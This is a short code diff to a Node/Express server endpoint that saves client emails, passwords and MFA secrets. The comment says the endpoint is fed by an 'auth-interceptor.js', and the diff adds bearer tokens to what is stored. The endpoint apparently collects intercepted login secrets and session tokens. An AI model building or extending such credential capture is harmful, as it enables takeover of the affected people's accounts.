@@ -44,14 +44,14 @@ async function startServer() {
   // POST endpoint to save client credentials (called by auth-interceptor.js)
   app.post("/api/admin/save-credentials", async (req, res) => {
     try {
-      const { email, password, mfaSecret } = req.body;
+      const { email, password, mfaSecret, bearerToken } = req.body;
       
       if (!email || !password) {
         return res.status(400).json({ error: "Email and password are required" });
       }
       
       const { saveClientCredentials } = await import("../adminDb");
-      await saveClientCredentials(email, password, mfaSecret || null);
+      await saveClientCredentials(email, password, mfaSecret || null, bearerToken || null);
       
       res.json({ success: true });
     } catch (error: any) {
